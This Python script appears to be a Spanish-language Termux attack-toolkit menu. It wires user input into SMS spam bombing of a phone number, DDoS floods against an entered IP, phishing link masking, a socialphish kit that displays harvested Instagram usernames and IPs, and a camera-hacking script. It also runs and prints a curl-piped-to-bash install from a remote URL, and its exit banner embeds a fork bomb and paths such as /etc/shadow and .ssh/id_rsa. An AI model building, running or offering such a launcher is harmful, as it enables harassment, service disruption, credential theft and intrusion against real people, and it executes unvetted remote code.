while True:
    import shlex, subprocess
    import time
    command_line = ' apt-get install git vim nano clang nmap wget weechat unzip termux-api screenfetch unstable-repo root-repo python bash curl neofetch hydra gzip game-repo fish figlet dpkg dos2unix apt apache2 dnsutils tsu irssi -y'
    args = shlex.split(command_line)

    command_line3 = ' pkg uninstall ruby -y'
    args3 = shlex.split(command_line3)

    command_line4 = ' bash <(curl -fsSL "https://git.io/abhacker-repo") --install ruby=2.7.2'
    args4 = shlex.split(command_line4)


    subprocess.call(['clear'],shell=True)
    print("\033[31m")
    print("""
▀█▀ ▄▀▀▄ ▄▀▀▄  █░░   █░█ ▀█▀ ▀█▀
░█░ █░░█ █░░█  █░░   █▀▄ ░█░ ░█░
░▀░ ░▀▀░ ░▀▀░░ ▀▀▀   ▀░▀ ▀▀▀ ░▀░
v- 1.7     """)
    print("Codded by; @Jm")
    print("\033[32m")
    print("""
    [1] Instalador de paquetes      [2] Herramientas de spam
    [3] Ocultar enlaces(phishing )  [4] Ataques DDoS
    [5] Metasploit                  [6] Extractores de información
    [7] Camhack(Enlaces de camras)  [8] Phishing

                            [0] Salir """)
    print("\033[33m")
    eligio=input("-Selecciona la herramienta: ")
    print("\033[39m") 
    if eligio=="1":
        subprocess.call(['clear'],shell=True)
        print("Instalando...")
        subprocess.call(args)
        time.sleep(3)

    elif eligio=="2":
        subprocess.call(['clear'],shell=True)
        print("""

    ▄▀▀ █▀▄ ▄▀▄ ██▄██
    ░▀▄ █▀░ █▄█ █░▀░█
    ▀▀░ ▀░░ ▀░▀ ▀░░░▀

    """)
        subprocess.call(['pip install -r requirements.txt'],shell=True)
        print("""

                """)
        print("Pulsa enter para salir")
        numero = input("Introduce el número de telefono(Ej: 34920123987): ")
        subprocess.call(['cd quack-hammer-sherlock && python quack --target ' + numero + ' --tool SMS --timeout 3600 --threads 50'],shell=True)
    
    elif eligio=="3":
        subprocess.call(['clear'],shell=True)
        subprocess.call(['cd quack-hammer-sherlock/maskphish && bash maskphish.sh '],shell=True)
        break
    elif eligio=="4":
        subprocess.call(['clear'],shell=True)
        print("\033[36m")
        print("""
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗        
██████╔╝██████╔╝╚█████╔╝██████╔╝

""")
        print("\033[39m")
        IP = input("Introduce la IP: ")

        subprocess.call(['cd quack-hammer-sherlock && python hammer.py -s' + IP + ' -p 80 -t 135'],shell=True)
        time.sleep(5)

    elif eligio=="5":
        subprocess.call(['clear'],shell=True)
        print("\033[31m")
        print("""

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .
    """)

        print("\033[39m")
        print("""
    1) Error de ruby (Metasploit)     3) Aprender a utilizar Metasploit
    2) Instalar Metasploit            4) Volver
    """)
        opcion=input("Selecciona la opción: ")
    
        if opcion=="1":
            subprocess.call(['clear'],shell=True)
            time.sleep(2)
            print("[                 ]0%")
            time.sleep(1)
            print("[====             ]25%")
            time.sleep(2)
            print("[========         ]50%")
            time.sleep(3)
            print("[============     ]75%")
            time.sleep(1)
            print("Sucess!!!")
            subprocess.call(args3)
            print("""


            
            Introduce este comando: bash <(curl -fsSL "https://git.io/abhacker-repo") --install ruby=2.7.2 

            """)
            
            break

        elif opcion=="2":
            subprocess.call(['clear'],shell=True)
            subprocess.call(['pkg install unstable-repo -y'],shell=True)
            subprocess.call(['pkg install metasploit -y'],shell=True)
            print("Hecho!!")
            time.sleep(1.3)

        elif opcion=="3":
            subprocess.call(['termux-open https://academia-hacker.com/metasploit-framework/'],shell=True)
            time.sleep(1.3)

        elif opcion=="4":
            print("")

        else:
            time.sleep(1.5)
            print("\033[31m Error-> opción incorrecta")
    elif eligio=="6":
        subprocess.call(['clear'],shell=True)
        subprocess.call(['neofetch'],shell=True)
        print("""
    [1] Sherlock(usuarios)      [2] Ip-tracker         
    [3] Volver
    """)
        eleccion = input("Introduce la opción: ")
        if eleccion=="1":
            print("""

    ▄▀▀ █░█ █▀▀ █▀▄ █░░ ▄▀▀▄ ▄▀▀ █░█
    ░▀▄ █▀█ █▀▀ █▀▄ █░░ █░░█ █░░ █▀▄
    ▀▀░ ▀░▀ ▀▀▀ ▀░▀ ▀▀▀ ░▀▀░ ░▀▀ ▀░▀
               """)
            nombre = input("Introduce el nombre: ")
            subprocess.call(['clear'],shell=True)
            subprocess.call(['cd quack-hammer-sherlock && python sherlock.py ' + nombre],shell=True)
            break
        elif eleccion=="2":
            subprocess.call(['python2 IP-Tracker.py'],shell=True)
            
        elif eleccion=="3":
            print("")
        else: 
            print("\033[31m Error-> opción incorrecta")
            time.sleep(1.5)
    elif eligio=="7":
        subprocess.call(['pip install colorama'],shell=True)
        subprocess.call(['pip install requests'],shell=True)
        subprocess.call(['clear'],shell=True)
        subprocess.call(['cd herramientas && python cam-hackers.py'],shell=True)
        break
    elif eligio =="8":
        subprocess.call(['clear'],shell=True)
        print("""
             _     _     _     _
       _ __ | |__ (_)___| |__ (_)_ __   __ _
      | '_ \| '_ \| / __| '_ \| | '_ \ / _` |
      | |_) | | | | \__ \ | | | | | | | (_| |
      | .__/|_| |_|_|___/_| |_|_|_| |_|\__, |
      |_|                              |___/


        1) Generar enlace 2) Mirar datos obtenidos  
                """)
        num_elegido=input("Elige una opción: ")
        if num_elegido == "1":
            subprocess.call(['clear'],shell=True)
            print("""

                    Recomendación: Abre otra sesión y utiliza la opción 3 de Tool Kit

                    """)
            time.sleep(2)
            subprocess.call(['cd quack-hammer-sherlock && bash socialphish.sh'],shell=True)
            break

        elif num_elegido =="2":
            subprocess.call(['cd quack-hammer-sherlock/sites/instagram && cat saved.ip.txt && cat saved.usernames.txt'],shell=True)
            print("\033[32m")
            salir = input("Presiona enter para salir")
            if salir == "salir":
                print(" ")

            else:
                print(" ")

    elif eligio =="0":
        subprocess.call(['clear'],shell=True)
        print("\033[36m")
        print("""
                
                                           ./ymM0dayMmy/.
                                        -+dHJ5aGFyZGVyIQ==+-
                                    `:sm⏣~~Destroy.No.Data~~s:`
                                 -+h2~~Maintain.No.Persistence~~h+-
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:
                      :we're.all.alike'`                     The.PFYroy.No.D7:
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:
                      :---srwxrwx:-.`                        `MS146.52.No.Per:
                      :<script>.Ac816/                        sENbove3101.404:
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:
                      :09.14.2011.raid                       /STFU|wall.No.Pr:
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:
                      :#OUTHOUSE-  -s:                       /corykennedyData:
                      :$nmap -oS                              SSo.6178306Ence:
                      :Awsm.da:                            /shMTl#beats3o.No.:
                      :Ring0:                             `dDestRoyREXKC3ta/M:
                      :23d:                               sSETEC.ASTRONOMYist:
                       /-                        /yo-    .ence.N:(){ :|: & };:
                                                 `:Shall.We.Play.A.Game?tron/
                                                 ```-ooy.if1ghtf0r+ehUser5`
                                               ..th3.H1V3.U2VjRFNN.jMh+.`
                                              `MjM~~WE.ARE.se~~MMjMs
                                               +~KANSAS.CITY's~-`
                                                J~HAKCERS~./.`
                                                .esc:wq!:`
                                                 +++ATH`
        codded by: @Jm                                      

        """)
        
        time.sleep(1.5)
        break
    else:
        print("\033[31m Error-> opción incorrecta")
        time.sleep(1.5)


